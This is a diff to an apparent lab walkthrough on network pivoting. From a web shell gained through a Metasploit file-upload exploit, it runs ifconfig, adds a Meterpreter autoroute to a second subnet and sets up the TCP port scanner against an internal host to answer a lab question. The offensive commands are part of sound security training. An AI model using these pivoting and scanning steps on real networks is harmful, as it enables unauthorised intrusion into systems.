@@ -226,3 +226,79 @@ bash: no job control in this shell
 www-data@demo1:/app/files$ 
 
 ```
+With ifconfig command you cna get the related network information
+
+```
+www-data@demo1:/app/files$ ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:c0:46:97:03  
+          inet addr:192.70.151.3  Bcast:192.70.151.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1171 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1127 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:169925 (169.9 KB)  TX bytes:77138 (77.1 KB)
+
+eth1      Link encap:Ethernet  HWaddr 02:42:c0:1c:8a:02  
+          inet addr:192.28.138.2  Bcast:192.28.138.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1602 (1.6 KB)  TX bytes:0 (0.0 B)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:300 (300.0 B)  TX bytes:300 (300.0 B)
+
+www-data@demo1:/app/files$ 
+
+```
+eth0 is the ip of the known device and eth1 is the address of the other subnet where the second machine is located.
+Add the route to meterpreter 
+
+```
+meterpreter > run autoroute -s 192.28.138.2
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.28.138.2/255.255.255.0...
+[+] Added route to 192.28.138.2/255.255.255.0 via 192.70.151.3
+[*] Use the -p option to list all active routes
+
+```
+Now use portscan exploit and set the parameters 
+
+```
+msf6 exploit(unix/webapp/xoda_file_upload) > search portscan
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  -----------
+   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
+   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
+   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
+   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
+   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
+   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
+   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
+   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator
+
+
+Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
+
+msf6 exploit(unix/webapp/xoda_file_upload) > use 5
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.28.138.3
+RHOSTS => 192.28.138.3
+
+```
+and you'll see the 3 services running, therefore you can answer the question
+<img width="1915" height="969" alt="Screenshot 2025-08-24 at 7 16 13 PM" src="https://github.com/user-attachments/assets/fe9bdef6-43b5-4c83-b6c2-74dc2ef3f384" />
+
